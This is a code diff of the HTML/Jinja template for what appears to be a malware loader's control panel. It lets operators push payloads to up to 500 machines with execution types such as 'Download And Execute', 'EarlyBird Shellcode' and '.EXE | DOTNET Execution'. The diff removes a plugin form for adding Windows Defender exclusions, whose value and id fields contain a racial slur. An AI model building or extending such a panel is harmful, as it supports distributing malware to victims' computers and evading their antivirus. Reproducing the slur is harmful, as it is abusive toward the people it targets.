@@ -46,11 +46,6 @@
                     <i class="fa-solid fa-file"></i>
                     Create Payload Load
                 </button>
-
-                <button onclick="openLightbox(1)" class="loadCreationButton">
-                    <i class="fa-solid fa-plug"></i>
-                    Create Plugin Load
-                </button>
             </div>
 
             <div id="lightboxesContainer">
@@ -66,12 +61,14 @@
                             <form action="#" method="post"  enctype=multipart/form-data>
                                 <label for="name">Execution Type</label>
                                 <select name="execution_type">
-                                    <option value="ANY | Download And Execute">ANY | Download And Execute</option>
-                                    <option value=".BIN | EarlyBird Shellcode">.BIN | EarlyBird Shellcode</option>
+                                    <option value=".EXE | DOTNET Execution">.EXE | DOTNET Execution</option>
                                 </select>
                 
                                 <label for="message">Amount</label>
                                 <input name="amount" type="number" placeholder="Out of 500, or blank for no limit">
+
+                                <label for="message">Note</label>
+                                <input name="note" type="text" placeholder="Locally stored note describing this load.">
         
                                 <label for="message">Payload</label>
                                 <input name="payload" type="file">
@@ -84,48 +81,15 @@
                         </div>
                     </div>
                 </div>
-                
-
-
-                <div class="lightbox"  id="secondLightbox">
-                    <div class="forms">
-                        <div class="form-container">
-                            <button class="close-bttn" onclick="closeLightbox()">
-                                <i class="fa-solid fa-angle-down"></i>
-                            </button>
-                            <h1 class="work-sans-light">Plugin Loading</h1>
-                            <hr>
-                            <form action="#" method="post">
-                                <label for="name">Command Type</label>
-                                <select name="Execution Type">
-                                    <option value="nigga">Windows Defender Exclusion</option>
-                                </select>
-        
-                                <label for="message">Description</label>
-                                <textarea class="description_plugins" name="message"
-                                    disabled>Only argument is a folder path. Cannot be a file path.</textarea>
-        
-                                <label for="message">Amount</label>
-                                <input type="number" placeholder="Out of 500, or blank for no limit">
-        
-                                <label for="message">Arguments</label>
-                                <input type="text">
-        
-                                <input id="nigga" type="submit" value="Submit">
-                            </form>
-                        </div>
-                    </div>
-                </div>
-        
             </div>
                 <table>
                     <thead>
                         <tr>
                             <th>Progress</th>
-                            <tH>Load ID</tH>
                             <th>Recursive</th>
                             <th>Command Type</th>
                             <th>Command Arguments</th>
+                            <th>Note</th>
                             <th>Action</th>
                         </tr>
                     </thead>
@@ -134,14 +98,14 @@
                         <tr>
                             <td>
                                 <div class="progress-container">
-                                    <div class="progress-bar" style="width: 50%;"></div>
+                                    <div class="progress-bar" style="width: {{ load.percent_completed }}%;"></div>
                                 </div>
                             </td>
-                            <td>{{ load.load_id }}</td>
                             {% if load.is_recursive %}<td><i class="fa-solid fa-check"></i></td>{% endif %}
                             {% if not load.is_recursive %}<td><i class="fa-solid fa-xmark"></i></td>{% endif %}
                             <td>{{ load.cmd_type }}</td>
                             <td>{{ load.cmd_args }}</td>
+                            <td>{{ load.note }}</td>
                             <td>
                                 <button class="remove-button" onclick="delete_load('{{ load.load_id }}')">
                                     <i class="fa-solid fa-trash"></i> Delete
